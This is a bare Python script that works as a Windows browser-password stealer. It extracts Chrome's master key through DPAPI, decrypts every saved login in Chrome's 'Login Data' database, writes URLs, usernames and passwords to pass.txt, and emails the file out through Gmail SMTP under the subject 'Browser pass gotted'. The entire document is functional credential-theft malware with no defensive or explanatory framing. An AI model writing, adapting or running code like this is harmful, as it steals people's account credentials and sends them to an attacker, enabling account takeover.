import os
import json
import base64
import tempfile
import sqlite3
import smtplib
import win32crypt
from Cryptodome.Cipher import AES
import shutil
from datetime import datetime, timedelta
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def main():
    way = tempfile.gettempdir()
    os.chdir(path=way)
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.txt"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        if username or password:
            f = open("pass.txt", "a")
            f.write(f" Origin URL: {origin_url}\n Action URL: {action_url}\n Username: {username}\n Password: {password} \n\n\n")
        else:
            continue
    cursor.close()
    db.close()

    email_user = "example@gmail.com"
    email_sent = "example@gmail.com"
    subject = "Browser pass gotted"

    msg = MIMEMultipart()
    msg["From"] = email_user
    msg["To"] = email_sent
    msg["Subject"] = subject
    body = f"got browser password"
    msg.attach(MIMEText(body, ""))
    filenames = "pass.txt"
    attachment = open(filenames, "rb")
    part = MIMEBase("application", "octet-stream")
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header("content-Disposition", "attachment; filename=" + filenames)
    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email_user, "App-Password")
    server.sendmail(email_user, email_sent, text)
    server.quit()
if __name__ == "__main__":
    main()
